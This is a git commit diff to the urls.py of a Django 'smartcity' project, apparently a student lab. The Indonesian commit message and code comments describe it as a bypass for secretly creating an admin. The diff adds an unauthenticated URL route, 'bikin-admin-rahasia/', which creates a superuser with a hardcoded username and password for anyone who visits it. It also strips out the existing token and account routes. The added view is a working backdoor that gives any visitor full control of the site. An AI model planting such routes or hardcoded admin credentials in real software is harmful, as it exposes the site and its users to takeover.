456c038da50635b21b2c2abdbdf9df0b10372625
laika <laikapriyadi4@gmail.com>
2026-06-12 00:00:01 +0700

    Bypass bikin admin via URL

--- Lab_24782079/server_smartcity/smartcity_app/urls.py
+++ Lab_24782079/server_smartcity/smartcity_app/urls.py
@@ -1,18 +1,22 @@
 from django.contrib import admin
 from django.urls import path, include
-from rest_framework_simplejwt.views import (
-    TokenObtainPairView,
-    TokenRefreshView,
-)
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+
+# Fungsi penyelundup akun admin tertinggi
+def buat_admin_rahasia(request):
+    User = get_user_model()
+    username = 'laika_admin'
+    password = 'laikapassword123'
+    
+    if not User.objects.filter(username=username).exists():
+        User.objects.create_superuser(username=username, email='', password=password)
+        return HttpResponse("<h1>=== SUKSES: Akun Superuser Berhasil Dibuat! ===</h1>")
+    else:
+        return HttpResponse("<h1>=== INFO: Akun laika_admin sudah ada di database! ===</h1>")
 
 urlpatterns = [
     path('admin/', admin.site.urls),
-    # Letakkan usermanagement DI ATAS auth.urls agar logout kustom kita yang dipakai
-    path('accounts/', include('usermanagement_24782079.urls')), 
-    path('accounts/', include('django.contrib.auth.urls')),
-    path('', include('main_app.urls')),
-    path('dashboard/', include('dashboard_24782079.urls')),
-    path('api/', include('main_app.api_urls')), # Hubungkan ke api_urls.py
-    path('api/token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
-    path('api/token/refresh/', TokenRefreshView.as_view(), name='token_refresh'),
+    path('api/', include('api.urls')), # Jalur API punyamu yang lama tetap aman
+    path('bikin-admin-rahasia/', buat_admin_rahasia), # Jalur pemicu baru kita
 ]
